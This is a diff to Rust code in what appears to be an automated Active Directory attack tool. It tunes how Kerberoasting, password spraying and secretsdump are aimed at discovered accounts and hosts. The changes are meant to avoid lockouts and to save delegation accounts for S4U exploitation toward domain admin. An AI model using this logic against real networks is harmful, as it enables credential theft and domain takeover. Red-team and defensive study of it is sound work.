@@ -84,6 +84,10 @@ pub async fn auto_credential_access(
                 .credentials
                 .iter()
                 .filter(|c| !c.domain.is_empty())
+                // Skip delegation accounts — Kerberoast is already done with
+                // other creds, and burning auth on delegation accounts risks
+                // lockout before S4U can use them.
+                .filter(|c| !state.is_delegation_account(&c.username))
                 .filter_map(|cred| {
                     let cred_domain = cred.domain.to_lowercase();
                     let dedup = format!("krb:{}:{}", cred_domain, cred.username.to_lowercase());
@@ -151,6 +155,9 @@ pub async fn auto_credential_access(
                 .users
                 .iter()
                 .filter(|u| !u.domain.is_empty())
+                // Skip delegation accounts — their auth budget is reserved for
+                // S4U exploitation. Spraying them causes lockout before S4U fires.
+                .filter(|u| !state.is_delegation_account(&u.username))
                 .filter_map(|u| {
                     let user_domain = u.domain.to_lowercase();
                     let dedup = format!("{}:{}", user_domain, u.username.to_lowercase());
@@ -225,6 +232,8 @@ pub async fn auto_credential_access(
                 .credentials
                 .iter()
                 .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
+                // Skip delegation accounts — their auth is reserved for S4U.
+                .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                 .filter_map(|cred| {
                     let cred_domain = cred.domain.to_lowercase();
                     let dedup = format!("{}:{}", cred_domain, cred.username.to_lowercase());
@@ -278,11 +287,12 @@ pub async fn auto_credential_access(
             }
         }
 
-        // --- Secretsdump per new credential against ALL hosts ---
-        // Mirrors Python: dispatches secretsdump for EVERY new credential against
-        // ALL discovered hosts (not just DCs). Credentials may be local admin on
-        // member servers. Secretsdump will fail fast if the cred lacks admin rights,
-        // but when it succeeds it's the fastest path to krbtgt and DA.
+        // --- Secretsdump per new credential against same-domain hosts ---
+        // Dispatches secretsdump for new credentials against hosts in the same
+        // domain (or child/parent domains). Cross-domain attempts generate
+        // failed auths that trigger AD account lockout.
+        // Credentials may be local admin on member servers — secretsdump fails
+        // fast if not, but when it succeeds it's the fastest path to DA.
         let sd_work: Vec<(String, String, ares_core::models::Credential)> = {
             let state = dispatcher.state.read().await;
 
@@ -295,17 +305,51 @@ pub async fn auto_credential_access(
                     .credentials
                     .iter()
                     .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
+                    // Skip delegation accounts — secretsdump will always fail
+                    // (they're not admin) and burns auth budget needed for S4U.
+                    .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                 {
                     let cred_domain = cred.domain.to_lowercase();
-                    // Target all hosts, not just DCs — credential may be local admin
                     for host in &state.hosts {
+                        // Resolve host domain: prefer hostname FQDN, fall back
+                        // to domain_controllers map for bare-IP hosts.
+                        let host_domain = {
+                            let from_hostname = host
+                                .hostname
+                                .to_lowercase()
+                                .split_once('.')
+                                .map(|x| x.1)
+                                .unwrap_or("")
+                                .to_string();
+                            if from_hostname.is_empty() {
+                                // Check if this IP is a known DC
+                                state
+                                    .domain_controllers
+                                    .iter()
+                                    .find(|(_, ip)| ip.as_str() == host.ip)
+                                    .map(|(d, _)| d.to_lowercase())
+                                    .unwrap_or_default()
+                            } else {
+                                from_hostname
+                            }
+                        };
+                        // Only target same-domain hosts. Skip unknown-domain
+                        // hosts — they'll be retried next cycle after nmap
+                        // populates hostnames.
+                        if host_domain.is_empty()
+                            || (host_domain != cred_domain
+                                && !host_domain.ends_with(&format!(".{cred_domain}"))
+                                && !cred_domain.ends_with(&format!(".{host_domain}")))
+                        {
+                            continue;
+                        }
+
                         let dedup = format!(
                             "{}:{}:{}",
                             host.ip,
                             cred_domain,
                             cred.username.to_lowercase()
                         );
-                        // Use unified DEDUP_SECRETSDUMP (not separate DEDUP_CRED_SECRETSDUMP)
                         if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                             items.push((dedup, host.ip.clone(), cred.clone()));
                         }
@@ -357,6 +401,23 @@ pub async fn auto_credential_access(
                     .filter(|(domain, _)| {
                         let key = format!("common:{}", domain.to_lowercase());
                         !state.is_processed(DEDUP_PASSWORD_SPRAY, &key)
+                    })
+                    // Only spray after initial recon (AS-REP) has completed.
+                    // This prevents spraying in the first cycle when Kerberoast
+                    // hasn't had time to collect hashes yet.
+                    .filter(|(domain, _)| {
+                        state.is_processed(DEDUP_ASREP_DOMAINS, domain)
+                            || state.is_processed(DEDUP_ASREP_DOMAINS, &domain.to_lowercase())
+                    })
+                    // Skip domains with Kerberoast hashes pending crack —
+                    // offline cracking is safer (no lockout risk) and handles
+                    // complex passwords that spray would never find.
+                    .filter(|(domain, _)| {
+                        let d = domain.to_lowercase();
+                        !state.hashes.iter().any(|h| {
+                            h.hash_type.to_lowercase().contains("kerberoast")
+                                && h.domain.to_lowercase() == d
+                        })
                     })
                     .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
                     .collect()
